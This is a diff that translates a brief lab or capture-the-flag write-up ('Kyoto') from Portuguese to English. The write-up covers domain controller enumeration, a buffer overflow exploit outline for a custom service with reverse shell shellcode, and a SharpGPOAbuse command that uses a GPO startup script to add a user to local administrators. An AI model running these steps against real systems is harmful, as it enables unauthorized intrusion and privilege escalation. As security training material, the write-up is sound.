@@ -1,7 +1,7 @@
 # Kyoto
 > DC enum + buffer overflow + SharpGPOAbuse
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
@@ -11,28 +11,28 @@ nmap -sC -sV -oN nmap.txt <IP>
 enum4linux -a <IP>
 ```
 
-Serviço customizado com buffer overflow identificado.
+Custom service with buffer overflow identified.
 
-## Exploração
+## Exploitation
 
-Análise do binário → identificação de offset e controle de EIP.
+Binary analysis → offset identification and EIP control.
 
 ```
 msf-pattern_create -l 500
 msf-pattern_offset -q <EIP value>
 ```
 
-Exploit desenvolvido com shellcode de reverse shell:
+Exploit developed with reverse shell shellcode:
 
 ```python
 buf = b"A" * offset + struct.pack("<I", ret_addr) + shellcode
 ```
 
-Acesso inicial obtido como usuário de baixo privilégio.
+Initial access obtained as low-privilege user.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
-Usuário com permissão de editar GPO identificado:
+User with GPO edit permission identified:
 
 ```
 .\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "net localgroup administrators <user> /add" --GPOName "Default Domain Policy"
@@ -42,4 +42,4 @@ Usuário com permissão de editar GPO identificado:
 gpupdate /force
 ```
 
-Administrador local obtido → SYSTEM.
+Local administrator obtained → SYSTEM.
